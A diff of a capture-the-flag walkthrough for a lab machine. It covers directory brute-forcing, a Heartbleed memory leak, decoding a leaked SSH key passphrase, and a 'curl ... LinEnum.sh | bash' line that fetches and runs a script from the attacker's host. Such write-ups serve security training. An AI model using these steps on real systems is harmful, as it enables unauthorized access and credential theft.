@@ -40,7 +40,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 On the web page on port 80 there is an image of a bleeding heart which is the logo of the **Heartbleed** vulnerability, so maybe that is a hint to exploit that. This vulnerability allows an attacker to leak data from the memory.
 
-Before exploiting that lets look for hidden directories with **Gobuster**:
+Before exploiting that, lets look for hidden directories with **Gobuster**:
 ```markdown
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.79
 ```
@@ -53,7 +53,7 @@ It finds interesting directories:
 The directory _/encode_ and _/decode_ are PHP files where it is possible to input text and it gets encoded / decoded into Base64.
 
 In the directory _/dev_ are two files:
-- notes.txt:
+- notes.txt
 ```markdown
 To do:
 
@@ -86,7 +86,7 @@ I will use a [Heartbleed script from Github](https://gist.github.com/eelsivart/1
 python heartbleed.py -n 100 10.10.10.79
 ```
 
-Every now and then, it sends the content _"$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=="_ to the _/decode_ directory with. Lets Base64 decode the string:
+Every now and then, something sends the content _"$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=="_ to the _/decode_ directory. Lets Base64 decode the string:
 ```markdown
 echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
 ```
@@ -98,7 +98,7 @@ Trying out if that is the password for the private key:
 ```markdown
 chmod 600 hype_key
 
-ssh -i hype@10.10.10.79
+ssh -i hype_key hype@10.10.10.79
 ```
 
 It works and we are logged in as the user _hype_.
@@ -110,7 +110,7 @@ To get an attack surface, we can run any **Linux Enumeration Script** on the box
 curl 10.10.14.24/LinEnum.sh | bash
 ```
 
-After analyzing the results, there are contents in the bash history of that user in the _.bash_history_ file where he executed **tmux**:
+After analyzing the results, there are contents in the _./bash_history_ file of that user where he executed **tmux**:
 ```markdown
 tmux -S /.devs/dev_sess
 ```
